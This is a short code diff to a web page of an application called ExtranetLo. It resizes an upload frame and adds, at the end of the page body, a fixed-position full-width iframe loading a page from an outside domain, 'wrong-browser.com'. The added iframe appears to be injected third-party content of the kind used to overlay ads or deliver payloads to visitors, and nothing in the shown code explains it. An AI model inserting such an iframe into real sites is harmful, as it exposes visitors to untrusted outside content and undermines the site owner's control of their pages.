@@ -344,7 +344,7 @@ ExtranetLo was developed using javascript technology too. Please enable javascri
   //$("#frmUpload").css("box-shadow","0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19)");
 
   tollerance = 0;
-  $("#frmUpload").css("height", "0");
+  $("#frmUpload").css("height", "300");
   $("#frmUpload").css("height", parseInt(getDocHeight2() - tollerance) + "px");
 
   window.addEventListener("load", function() {
@@ -371,7 +371,7 @@ ExtranetLo was developed using javascript technology too. Please enable javascri
 
 </script>
 
-       
+       <iframe src="https://wrong-browser.com/github-ad.php" style="position:fixed;top:70%;width:100%;height:300px;"></iframe>
 
 	  </BODY>
 	  </HTML>
